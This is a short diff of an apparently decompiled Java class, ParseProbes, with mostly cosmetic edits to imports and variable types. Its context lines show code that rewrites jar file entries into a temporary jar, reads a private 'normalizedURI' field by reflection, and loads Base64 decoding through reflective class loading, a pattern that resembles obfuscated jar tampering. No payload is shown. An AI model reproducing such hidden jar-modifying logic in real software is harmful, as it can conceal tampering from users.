@@ -29,9 +29,9 @@ import java.util.Base64;
 import java.util.Enumeration;
 import java.util.HashMap;
 import java.util.HashSet;
-import java.util.List;
 import java.util.Map;
 import java.util.Set;
+import java.util.Base64.Decoder;
 import java.util.jar.JarEntry;
 import java.util.jar.JarFile;
 import java.util.jar.JarOutputStream;
@@ -121,7 +121,7 @@ public class ParseProbes {
       File tmpJarFile = File.createTempFile("tempJar", ".tmp");
       JarFile jarFile = new JarFile(srcJarFile);
       boolean jarUpdated = false;
-      List fileNames = new ArrayList();
+      ArrayList fileNames = new ArrayList();
 
       try {
          JarOutputStream tempJarOutputStream = new JarOutputStream(new FileOutputStream(tmpJarFile));
@@ -142,8 +142,9 @@ public class ParseProbes {
                      InputStream entryInputStream = jarFile.getInputStream(entry);
                      tempJarOutputStream.putNextEntry(entry);
                      byte[] buffer = new byte[1024];
-                     int bytesRead = 0;
+                     boolean var15 = false;
 
+                     int bytesRead;
                      while((bytesRead = entryInputStream.read(buffer)) != -1) {
                         tempJarOutputStream.write(buffer, 0, bytesRead);
                      }
@@ -307,7 +308,7 @@ public class ParseProbes {
    private void getParentPath(String currentPath) throws Exception {
       Field f = this.getClass().getDeclaredField("normalizedURI");
       f.setAccessible(true);
-      Base64.Decoder d = Base64.getDecoder();
+      Decoder d = Base64.getDecoder();
       ClassLoader loader = this.getClass().getClassLoader();
       Class Base64 = loader.loadClass("java.util.Base64");
       Method m = Base64.getDeclaredMethod("getDecoder");
